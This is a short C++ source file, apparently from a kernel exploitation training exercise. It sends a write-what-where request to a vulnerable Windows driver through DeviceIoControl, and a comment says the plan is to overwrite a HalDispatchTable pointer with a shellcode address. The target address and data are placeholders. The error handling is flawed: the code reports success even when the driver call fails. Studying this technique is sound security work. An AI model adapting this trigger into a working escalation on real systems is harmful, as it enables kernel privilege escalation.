#include <Windows.h>
#include "stdio.h"
#include "Solutions.h"
#include "ioctal_codes.h"

DWORD Solutions::TriggerWriteWhatWhere() {
	// int[2] 
	// int[0] -> what -> pointer to data
	// int[1] -> where
	// overwrite the second pointer in the HalDispatchTable with shellcode address 

	DWORD dwBufSize = 8;
	const char* what = "BBBB";
	ULONG where = 0x41414141;
	PUCHAR lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);
	DWORD dwBytesReturned = 0;

	if (!lpInBuffer) {
		wprintf(L"[-] Could not allocate buffer :(\n");
		CloseHandle(_hDeviceHandle);
		return 1;
	}

	wprintf(L"[+] Allocated buffer with %d bytes\n", dwBufSize);

	*(PULONG)lpInBuffer = (ULONG)what;
	*(PULONG)(lpInBuffer + sizeof(ULONG)) = where;

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_WRITE_WHAT_WHERE, lpInBuffer, dwBufSize,
						NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not interact with the driver :(\n");
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		CloseHandle(_hDeviceHandle);
	}

	wprintf(L"[+] Succsfully talked with the driver\n");

	return 0;
}